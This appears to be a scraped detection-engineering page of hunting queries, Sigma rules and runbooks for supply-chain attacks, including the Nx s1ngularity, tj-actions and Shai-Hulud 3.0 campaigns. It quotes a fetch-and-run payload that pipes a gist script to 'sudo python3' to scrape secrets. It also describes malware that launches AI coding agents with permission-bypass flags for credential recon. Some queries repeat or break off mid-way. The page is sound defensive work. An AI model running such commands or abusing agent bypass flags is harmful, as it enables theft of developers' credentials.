ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2009-0556")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2009-0556")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

| sort - severity

Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Nx s1ngularity: npm postinstall weaponizes AI CLI tools (claude/gemini/q) for credential recon · [LLM] Nx s1ngularity exfiltration via public GitHub repo 's1ngularity-repository' · [LLM] tj-actions/changed-files: CI runner pipes gist memdump.py to python to scrape secrets
Nx s1ngularity: npm postinstall weaponizes AI CLI tools (claude/gemini/q) for credential recon AIActions on Objectives High
Hunts the s1ngularity Nx compromise where the malicious telemetry.js postinstall script invoked locally-installed AI coding agents (Claude, Gemini, Amazon Q) non-interactively with permission-bypass flags to recursively hunt wallets, SSH keys and tokens. Pairs the AI-CLI child binary with auto-approve flags and a node/npm/shell package-script parent — the novel TTP this incident introduced. Rationale: Article names the Nx (s1ngularity) compromise abusing locally installed AI CLI tools; corroborating write-ups confirm telemetry.js postinstall invoked claude --dangerously-skip-permissions, gemini --yolo and q --trust-all-tools for recon — the AI-CLI binary + auto-approve flag + node parent triple is unique to this campaign and not a generic LOLBin pattern. Cross-checked against: • https://nx.dev/blog/s1ngularity-postmortem • https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/ • https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html
ATT&CKT1195.002 T1059 T1552.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer legitimately running 'claude --dangerously-skip-permissions' in a local automation script
  • CI pipeline using 'gemini --yolo' or 'q --no-interactive' for code generation or review
  • Security researcher reproducing the s1ngularity payload in a sandbox
  • Internal agentic-AI tooling that auto-approves tool calls from a node-based wrapper
Suppression filter
| where InitiatingProcessFileName !in~ ("code","cursor","windsurf","code-insiders")
Response runbook
1) Triage: pull the full ProcessCommandLine and the parent chain — confirm the AI CLI was spawned by node/npm/npx/telemetry.js rather than an interactive terminal, and inspect the prompt for filesystem/credential recon keywords. Check npm/yarn lockfiles on the host for compromised Nx versions. 2) Contain: isolate the host, revoke and rotate all GitHub PATs, npm tokens, SSH keys and cloud credentials reachable from that workstation, and check GitHub org for new public repos. 3) Hunt: search the same user/host for writes to /tmp/inventory.txt, ~/.bashrc 'sudo shutdown' appends, and 'gh repo create' or git remotes referencing s1ngularity-repository (UC2).
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("claude","gemini","q","claude.exe","gemini.exe","q.exe")
| where ProcessCommandLine has_any ("--dangerously-skip-permissions","--yolo","--trust-all-tools","--no-interactive")
| where InitiatingProcessFileName in~ ("node","npm","npx","sh","bash","zsh","node.exe","npm.cmd","npx.cmd")
   or InitiatingProcessCommandLine has_any ("telemetry.js","postinstall","nx")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("claude","gemini","q")
| where ActingProcessCommandLine has_any ("--dangerously-skip-permissions","--yolo","--trust-all-tools","--no-interactive")
| where ParentProcessName has_any ("node","npm","npx","sh","bash","zsh")
   or ParentProcessCommandLine has_any ("telemetry.js","postinstall","nx")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: Nx s1ngularity AI CLI Weaponized For Credential Recon
id: 7a1f2c84-6d3e-4b9a-9f21-3c8d4e5a6b70
status: experimental
description: Detects locally installed AI coding agents (claude/gemini/q) invoked non-interactively with permission-bypass flags by a node/npm package-install context, as seen in the Nx s1ngularity npm compromise.
references:
  - https://nx.dev/blog/s1ngularity-postmortem
  - https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/
author: SOC Detection Engineering
date: 2026/06/26
tags:
  - attack.t1195.002
  - attack.t1059
  - attack.t1552.001
logsource:
  category: process_creation
  product: linux
detection:
  selection_img:
    Image|endswith:
      - '/claude'
      - '/gemini'
      - '/q'
  selection_flag:
    CommandLine|contains:
      - '--dangerously-skip-permissions'
      - '--yolo'
      - '--trust-all-tools'
      - '--no-interactive'
  condition: selection_img and selection_flag
level: high
source:linux.auditd @auditd.type:EXECVE (@process.command_line:(*--dangerously-skip-permissions* OR *--yolo* OR *--trust-all-tools*)) (@process.name:(claude OR gemini OR q) OR @process.executable.path:(*/claude OR */gemini OR */q))
#event_simpleName=ProcessRollup2 ImageFileName=/\/(claude|gemini|q)(\.exe)?$/i
| CommandLine=/--(dangerously-skip-permissions|yolo|trust-all-tools|no-interactive)/i
| ParentBaseFileName=/(node|npm|npx|sh|bash|zsh)/i
| groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("claude","gemini","q","claude.exe","gemini.exe","q.exe")) (Processes.process IN ("*--dangerously-skip-permissions*","*--yolo*","*--trust-all-tools*","*--no-interactive*")) (Processes.parent_process_name IN ("node","npm","npx","sh","bash","zsh","node.exe","npm.cmd","npx.cmd") OR Processes.parent_process IN ("*telemetry.js*","*postinstall*","*nx*")) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("claude","gemini","q","claude.exe","gemini.exe","q.exe")) (Processes.process IN ("*--dangerously-skip-permissions*","*--yolo*","*--trust-all-tools*","*--no-interactive*")) (Processes.parent_process_name IN ("node","npm","npx","sh","bash","zsh","node.exe","npm.cmd","npx.cmd") OR Processes.parent_process IN ("*telemetry.js*","*postinstall*","*nx*")) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
Nx s1ngularity exfiltration via public GitHub repo 's1ngularity-repository' AIActions on Objectives High
Hunts the exfiltration stage of the Nx s1ngularity attack, where stolen data was pushed to attacker-forced public GitHub repositories named 's1ngularity-repository' (with random 5-char suffixes) and staged in /tmp/inventory.txt before upload via the gh/git CLI. The repo-name string is a near-unique campaign IOC. Rationale: Corroborated reporting confirms exfil repos named s1ngularity-repository(-aaaaa) and data staged in /tmp/inventory.txt; both strings are specific to this campaign, making a literal command-line match an extremely high-fidelity, low-FP alert. Cross-checked against: • https://nx.dev/blog/s1ngularity-postmortem • https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html
ATT&CKT1567 T1195.002 T1552.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel analyst pasting the IOC string into a terminal/ticket while investigating
  • Detection engineer building or testing this very rule with a sample command
  • Honeypot or purple-team exercise replaying the s1ngularity exfil chain
Response runbook
1) Triage: confirm whether the command actually created/pushed to a remote (gh repo create, git push) versus a benign string reference; identify the GitHub identity used. 2) Contain: isolate host, revoke the GitHub PAT/OAuth token, and request GitHub/org admin to delete any public s1ngularity-repository* repos and pull their commit contents for scope. 3) Hunt: enumerate all secrets staged in /tmp/inventory.txt, rotate everything exposed, and pivot to UC1 on the same host to confirm the AI-CLI recon precursor and any ~/.bashrc shutdown persistence.

tj-actions/changed-files: CI runner pipes gist memdump.py to python to scrape secrets AIActions on Objectives High
Hunts the tj-actions/changed-files supply-chain compromise (CVE-2025-30066) where the trojanized action curled nikitastupin's memdump.py gist and piped it to sudo python3 to dump runner memory and log double-base64 secrets. Targets the specific gist URL, memdump.py, and the malicious commit hash on self-hosted/instrumented runners. Rationale: CISA and Wiz confirm the exact payload 'curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3' and malicious commit 0e58ed86...; these literal strings are unique campaign IOCs giving a near-zero-FP alert on any self-hosted or Defender/Falcon-instrumented runner. Cross-checked against: • https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction • https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066 • https://github.com/advisories/ghsa-mrrh-fwg8-r2c3
ATT&CKT1195.002 T1552.001 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security team detonating the IOC on a test runner to validate detection coverage
  • Threat-intel researcher fetching memdump.py to analyze the payload
  • Tabletop/purple-team replay of the tj-actions compromise
Response runbook
1) Triage: identify the runner/host and the workflow that executed the payload; confirm whether memdump.py actually ran (python3 child) and pull the build log for the double-base64 secret blob. 2) Contain: rotate every secret reachable by that workflow — GitHub PATs, npm tokens, cloud keys, RSA private keys — and pin all tj-actions/changed-files references to v46.0.1 or a verified SHA; revoke the runner's credentials. 3) Hunt: search all repos/workflow logs for the malicious commit 0e58ed8671d6b60d0890c21b07f8835ace038e67 and re-pointed tags (v44.5.1, v35.7.7-sec), and grep build logs for double-base64 secret blobs that were exposed publicly.

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children

    A signed vendor binary (in the article's named-vendors list)

    category: process_creation
    product: windows

    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium

      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

The Holiday Whisper: Shai-Hulud 3.0

Snyk
2025-12-29 5 use cases 3 techniques 5 kill-chain phases detected

A refined variant of the Shai-Hulud malware, dubbed The Golden Path, has been discovered targeting the npm ecosystem during the holiday season. Security teams are encouraged to prioritize structural hardening, such as disabling lifecycle scripts, to mitigate risks during this testing phase.

ATT&CKT1027 T1190 T1195.002

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Compromised npm package @vietmoney/react-big-calendar@0.26.2 installation (Shai-Hulud 3.0)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] npm/yarn/pnpm/bun lifecycle hook spawning shell or network LOLBin
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Shai-Hulud 3.0 'Goldox-T3chs' GitHub exfiltration marker observed
Compromised npm package @vietmoney/react-big-calendar@0.26.2 installation (Shai-Hulud 3.0) AIDelivery High
Detects the install/use of the specific malicious npm package version named in the Snyk advisory. Catches package introduction across npm/yarn/pnpm/bun on Windows + Linux developer and CI hosts, including the Bun runtime the v3.0 variant explicitly targets. Rationale: Article-specific package identifier `@vietmoney/react-big-calendar` (and the targeted v0.26.2) is a unique high-fidelity string; the broader Snyk family of Shai-Hulud variants has been independently corroborated by multiple security vendors (referenced in claude-mem observation 1325, see also OX Security and Aikido write-ups of prior Shai-Hulud iterations). Bun runtime is explicitly added to the binary list because the article calls out the v3.0 "patch" specifically fixing Bun compatibility. Cross-checked against: • https://snyk.io/blog/shai-hulud-3-0/
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal security team intentionally pulling the malicious package into a sandbox for reverse-engineering
  • SCA tooling (Snyk CLI, Aikido scanner) emitting the package name in remediation reports/log lines without actually installing it
  • Mirror/proxy administrators referencing the package name when blocklisting it in Nexus/Verdaccio configs
  • Pen-test or purple-team supply-chain emulation exercises
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("snyk","aikido","socket.dev","stepsecurity","trufflehog","semgrep") and InitiatingProcessCommandLine !has "install")
Response runbook
1) Triage: pull package-lock.json/yarn.lock/pnpm-lock.yaml from the affected host and git-blame which commit introduced the dep; collect every npm/yarn/pnpm/bun process tree for the install window and dump environment variables that were accessible to node.exe at install time (npm tokens, GH tokens, cloud creds). 2) Contain: isolate the host or CI runner; force-rotate all credentials reachable from that machine (npm publish tokens, GITHUB_TOKEN, AWS/GCP/Azure CLI creds, kubectl contexts, .env contents); purge node_modules and any cached tarballs from npm/yarn/pnpm/Bun stores. 3) Hunt: pivot to outbound traffic to api.github.com / github.com from the same host since first-seen; search GitHub org audit log for new repo creations with description containing 'Goldox-T3chs' or 'Only Happy Girl'; search peer dev/CI hosts for the same package-version string in lockfiles.
let pkg = "@vietmoney/react-big-calendar";
let procHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where (FileName in~ ("node.exe","npm.cmd","npm.exe","pnpm.cmd","pnpm.exe","yarn.cmd","yarn.exe","bun.exe"))
         or (InitiatingProcessFileName in~ ("node.exe","npm.cmd","npm.exe","pnpm.cmd","pnpm.exe","yarn.cmd","yarn.exe","bun.exe"))
    | where ProcessCommandLine has pkg or InitiatingProcessCommandLine has pkg
    | extend Evidence = "process", Detail = coalesce(ProcessCommandLine, InitiatingProcessCommandLine)
    | project Timestamp, DeviceName, AccountName, Evidence, Detail, FileName, InitiatingProcessFileName, FolderPath;
let fileHits = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where FolderPath has @"node_modules\@vietmoney\react-big-calendar" or FolderPath has "node_modules/@vietmoney/react-big-calendar"
    | extend Evidence = "file", Detail = strcat(FolderPath, "\\", FileName)
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, Evidence, Detail, FileName, InitiatingProcessFileName, FolderPath;
procHits
| union fileHits
| order by Timestamp desc
let pkg = "@vietmoney/react-big-calendar";

let legacyHits = SecurityEvent

    | where CommandLine has pkg

let fileHits = ImFileEvent
    | where TimeGenerated > ago(30d)
    | where TargetFilePath has @"node_modules\@vietmoney\react-big-calendar" or TargetFilePath has "node_modules/@vietmoney/react-big-calendar"

npm/yarn/pnpm/bun lifecycle hook spawning shell or network LOLBin AIInstallation Medium
Hunts the primary execution vector named in the article: postinstall and preinstall lifecycle hooks invoking a shell, downloader, or git client. Article-specific because Snyk explicitly recommends `ignore-scripts=true` as the structural mitigation — the detection mirrors the exact behaviour that flag would have blocked. Rationale: Article anchors: the `postinstall` and `preinstall` lifecycle hooks plus the `ignore-scripts=true` recommendation directly map to a parent-child detection where the parent is the package manager invoking a lifecycle script and the child is anything capable of network egress or local persistence. Bun included because the article calls out the Bun runtime patch. Cross-vendor coverage of prior Shai-Hulud variants (claude-mem 1283, 1284) confirms the same hook-based execution pattern. Cross-checked against: • https://snyk.io/blog/shai-hulud-3-0/
ATT&CKT1059.007 T1546 T1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • node-gyp / prebuild-install spawning python.exe or sh during native-module compile
  • husky package running git.exe to install repo git hooks on postinstall
  • Cypress / Puppeteer / Playwright downloading browser binaries via curl/wget post-install
  • electron-builder fetching platform-specific binaries from GitHub releases
  • sharp / canvas / better-sqlite3 / node-sass and other native modules running platform shell scripts
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("node-gyp","prebuild-install","node-pre-gyp","husky install","cypress install","puppeteer","playwright install","electron-builder","sharp/install","@swc/core","esbuild/install"))
Response runbook
1) Triage: pull the full process tree (3+ levels deep) — confirm the grandparent is a developer or CI shell launching npm/yarn/pnpm/bun and capture which package's lifecycle script fired (look at the cwd and npm_package_name env var). Cross-reference the package against known-good ones in the org's allowlist. 2) Contain: kill the install, isolate the host/runner, snapshot disk (the malicious code is on filesystem at this point), and revoke any developer/CI tokens that were accessible during install (npm, GitHub PAT/Actions, cloud creds, kubectl). 3) Hunt: pivot to ScriptControlScanInfo / Sysmon EID 7 for any DLL the child loaded; search for the same parent-child pair on peer developer hosts and CI runners; check for AsepValueUpdate / scheduled-task creation in the next 5 minutes after the install for follow-on persistence.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe","npm.cmd","pnpm.cmd","yarn.cmd","bun.exe","npm","pnpm","yarn","bun","node")
| where InitiatingProcessCommandLine has_any ("postinstall","preinstall","npm-cli.js","pnpm-cli","yarn install","npm install","npm ci","pnpm install","bun install","run-script")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","curl.exe","wget.exe","bitsadmin.exe","certutil.exe","git.exe","schtasks.exe","reg.exe","bash","sh","python.exe","python","python3")
   or (FileName =~ "node.exe" and ProcessCommandLine has_any (" -e ","--eval","child_process","trufflehog","http.request","https.request"))
| where AccountName !endswith "$"
| extend ParentHook = case(
    InitiatingProcessCommandLine has "postinstall", "postinstall",
    InitiatingProcessCommandLine has "preinstall", "preinstall",
    "install-context")
| project Timestamp, DeviceName, AccountName, ParentHook,
          ParentCmd = InitiatingProcessCommandLine,
          ChildImage = FileName, ChildCmd = ProcessCommandLine,
          FolderPath, InitiatingProcessFolderPath, SHA256
| order by Timestamp desc
let LifecycleParents = dynamic(["node.exe","npm.cmd","pnpm.cmd","yarn.cmd","bun.exe","npm","pnpm","yarn","bun","node"]);
let SuspectChildren = dynamic(["powershell.exe","pwsh.exe","cmd.exe","curl.exe","wget.exe","bitsadmin.exe","certutil.exe","git.exe","schtasks.exe","reg.exe","bash","sh","python.exe","python","python3"]);
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any (LifecycleParents)
| where ParentProcessCommandLine has_any ("postinstall","preinstall","npm-cli.js","pnpm-cli","yarn install","npm install","npm ci","pnpm install","bun install","run-script")
| where ActingProcessName has_any (SuspectChildren)
   or (ActingProcessName has "node" and ActingProcessCommandLine has_any (" -e ","--eval","child_process","trufflehog"))
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentCmd=ParentProcessCommandLine,
          ActingProcessName, ChildCmd=ActingProcessCommandLine, Hashes
| order by TimeGenerated desc

Shai-Hulud 3.0 'Goldox-T3chs' GitHub exfiltration marker observed AIActions on Objectives High
Hunts for the verbatim attribution strings 'Goldox-T3chs' and 'Only Happy Girl' that the malware embeds in the description of attacker-owned GitHub repositories used as the exfil sink. Because the marker is hard-coded by the threat actor and ships with the malicious package, any sighting in cloud-app audit, script content, file writes, or process command lines is extremely high-fidelity. Rationale: Snyk article verbatim quote: "data was intended to be exfiltrated to GitHub repositories labeled with the description: 'Goldox-T3chs: Only Happy Girl'". This is a hand-picked attacker attribution string — virtually zero legitimate-use overlap. Detection covers cloud audit (where the marker first surfaces when the malware creates the dropper repo), endpoint script content (the marker is hardcoded in the dropper JS), and process command lines (any tool that interpolates the marker — gh CLI, curl to api.github.com). Cross-checked against: • https://snyk.io/blog/shai-hulud-3-0/
ATT&CKT1567 T1567.001 T1552.001
Data sourcesEndpoint.Processes Endpoint.Filesystem Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel analysts copy-pasting the marker into a hunt console (filter by known analyst SIDs / hostnames)
  • Snyk/Aikido/StepSecurity blog content cached locally by a researcher and indexed by file-content scanner
  • SOC tabletop / purple-team exercise emulating the Shai-Hulud 3.0 IOC
  • Vulnerability-scanner signature databases containing the string verbatim
Suppression filter
| where not (Account in ("<known_threat_intel_analyst_upn_1>","<known_threat_intel_analyst_upn_2>") and Source in ("DeviceProcessEvents","ImProcessCreate"))
Response runbook
1) Triage: identify the user/host that produced the marker hit; if the source is CloudAppEvents/AuditLogs, capture the GitHub repo URL, owner, and creation timestamp — pull the repo contents (clone via API) for IR review while it still exists. 2) Contain: if a GitHub repo with the marker exists in the org or against a developer's PAT, force-delete or have GitHub support freeze it; revoke and rotate every credential reachable from the originating host (npm publish tokens, GitHub PATs and Actions tokens, AWS/GCP/Azure CLI creds, .env contents, kubectl, SSH keys). Disable the implicated user's PAT and require fresh MFA. 3) Hunt: GitHub org-wide search for additional repos with description containing 'Goldox' or 'Only Happy Girl'; pull all push events from the impacted user/PAT over the last 30 days; search peer hosts for the @vietmoney/react-big-calendar package in lockfiles; look for TruffleHog-style credential-grepping behaviour (per claude-mem 1325).
let marker = dynamic(["Goldox-T3chs","Only Happy Girl","Goldox"]);
let cloudHits = CloudAppEvents
    | where Timestamp > ago(60d)
    | where Application has_any ("GitHub","github") or ApplicationId == 11161
    | where tostring(RawEventData) has_any (marker) or ObjectName has_any (marker) or tostring(ActivityObjects) has_any (marker)
    | project Timestamp, Source="CloudAppEvents", Application, ActionType, Account=AccountDisplayName, IPAddress, Detail=tostring(RawEventData);
let procHits = DeviceProcessEvents
    | where Timestamp > ago(60d)
    | where ProcessCommandLine has_any (marker) or InitiatingProcessCommandLine has_any (marker)
    | project Timestamp, Source="DeviceProcessEvents", Application=DeviceName, ActionType=FileName, Account=AccountName, IPAddress="", Detail=ProcessCommandLine;
let fileHits = DeviceFileEvents
    | where Timestamp > ago(60d)
    | where FileName has_any (marker) or FolderPath has_any (marker)
    | project Timestamp, Source="DeviceFileEvents", Application=DeviceName, ActionType, Account=InitiatingProcessAccountName, IPAddress="", Detail=strcat(FolderPath,"\\",FileName);
cloudHits | union procHits, fileHits | order by Timestamp desc
let marker = dynamic(["Goldox-T3chs","Only Happy Girl"]);
let fileHits = ImFileEvent
    | where TimeGenerated > ago(60d)
    | where ActingProcessCommandLine has_any (marker) or TargetFilePath has_any (marker) or TargetFileName has_any (marker)
    | project TimeGenerated, Source="ImFileEvent", Host=DvcHostname, Account=ActorUsername, Detail=coalesce(ActingProcessCommandLine, TargetFilePath);
let procHits = ImProcessCreate
    | where TimeGenerated > ago(60d)
    | where ActingProcessCommandLine has_any (marker) or ParentProcessCommandLine has_any (marker)
    | project TimeGenerated, Source="ImProcessCreate", Host=DvcHostname, Account=ActorUsername, Detail=ActingProcessCommandLine;
let auditHits = AuditLogs
    | where TimeGenerated > ago(60d)
    | where tostring(TargetResources) has_any (marker) or tostring(AdditionalDetails) has_any (marker) or tostring(InitiatedBy) has_any (marker)
    | project TimeGenerated, Source="AuditLogs", Host="", Account=tostring(InitiatedBy), Detail=tostring(TargetResources);
let webHits = ImWebSession
    | where TimeGenerated > ago(60d)
    | where Url has_any (marker) or HttpRequestHeaderUserAgent has_any (marker)
    | project TimeGenerated, Source="ImWebSession", Host=DvcHostname, Account=SrcUsername, Detail=Url;
fileHits | union procHits, auditHits, webHits | order by TimeGenerated desc

Vulnerable WindowsCodecs.dll (CVE-2025-50165) present on endpoint AIExploitation High
Surface hosts running WindowsCodecs.dll versions between 10.0.26100.0 and 10.0.26100.4945 that contain the uninitialized function pointer dereference reachable via 12-bit/16-bit JPG re-encoding. Pivots on the exact vulnerable SHA-1 from ESET's analysis and the Defender TVM CVE catalogue. Rationale: ESET names both the vulnerable build (10.0.26100.4768, SHA-1 5887D96565749067564BABCD3DC5D107AB6666BD) and the patched build (10.0.26100.4946, SHA-1 4EC1DC0431432BC318E78C520387911EC44F84FC). Hash-pinning gives near-zero false positives versus generic CVE banners. Cross-checked with the original Zscaler ThreatLabz disclosure and Microsoft MSRC's CVE entry. Cross-checked against: • https://www.zscaler.com/blogs/security-research/technical-analysis-cve-2025-50165 • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-50165
ATT&CKT1203
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
